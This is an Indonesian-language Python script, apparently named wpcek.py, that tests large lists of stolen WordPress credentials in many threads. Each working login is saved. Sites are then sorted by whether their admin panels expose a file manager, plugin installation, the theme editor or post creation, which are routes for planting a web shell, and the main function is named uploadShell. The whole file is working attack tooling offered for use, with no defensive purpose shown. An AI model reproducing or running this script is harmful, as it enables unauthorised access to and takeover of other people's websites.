import sys
import os
import requests
from multiprocessing.dummy import Pool as ThreadPool

G = '\033[0;32m'
W = '\033[0;37m'
R = '\033[0;31m'
C = '\033[1;36m'

progress_file = 'progress.txt'

def report_progress(progress):
    with open(progress_file, 'w') as f:
        f.write(f"{progress}\n")

def uploadShell(site, total_sites, index):
    asuna = site.replace('#', '|').replace('@', '|')
    try:
        site = asuna.split('|')[0]
        user = asuna.split('|')[1]
        pasw = asuna.split('|')[2]
        hd = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/83.0.4103.101 Safari/537.36'}
        r = requests.Session()
        cek = r.get(site, timeout=10)
        if cek.status_code == 200 or cek.status_code == 403 or 'Powered by WordPress' in cek.text or '/wp-login.php' in cek.text:
            login = r.post(site, headers=hd, data={'log': user, 'pwd': pasw}, timeout=10)
            if 'wp-admin/profile.php' in login.text or 'Found' in login.text or '/wp-admin' in login.text:
                with open('loginSuccess.txt', 'a') as saveLog:
                    saveLog.write(site + '#' + user + '@' + pasw + '\n')
                if 'WP File Manager' in login.text:
                    with open('wpfilemanager.txt', 'a') as assz:
                        assz.write(site + '#' + user + '@' + pasw + '\n')
                if 'plugin-install.php' in login.text:
                    with open('plugin-install.txt', 'a') as assz:
                        assz.write(site + '#' + user + '@' + pasw + '\n')
                if 'theme-editor.php' in login.text:
                    with open('wptheme.txt', 'a') as assz:
                        assz.write(site + '#' + user + '@' + pasw + '\n')
                if 'post-new.php' in login.text:
                    with open('page.txt', 'a') as assz:
                        assz.write(site + '#' + user + '@' + pasw + '\n')
            else:
                with open('failed.txt', 'a') as failLog:
                    failLog.write(site + '#' + user + '@' + pasw + '\n')
        else:
            with open('invalid.txt', 'a') as invalidLog:
                invalidLog.write(site + '#' + user + '@' + pasw + '\n')
    except Exception as e:
        with open('failed.txt', 'a') as failLog:
            failLog.write(f"{site}#{user}@{pasw} - Failed! ({e})\n")
    finally:
        progress = int((index / total_sites) * 100)
        report_progress(progress)

def main(filename, thread_count):
    try:
        with open(filename, 'r', encoding='utf-8', errors='ignore') as file:
            sites = file.read().splitlines()
        total_sites = len(sites)
        pool = ThreadPool(thread_count)
        for i, site in enumerate(sites):
            pool.apply_async(uploadShell, args=(site, total_sites, i + 1))
        pool.close()
        pool.join()
    except FileNotFoundError:
        print(f'File {filename} tidak ditemukan.')
    except ValueError:
        print('Masukkan jumlah thread yang valid.')
    except Exception as e:
        print(f'Terjadi kesalahan: {e}')

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python wpcek.py <filename> <thread_count>")
    else:
        filename = sys.argv[1]
        thread_count = int(sys.argv[2])
        print(f"Running wpcek.py with file: {filename} and threads: {thread_count}")
        main(filename, thread_count)
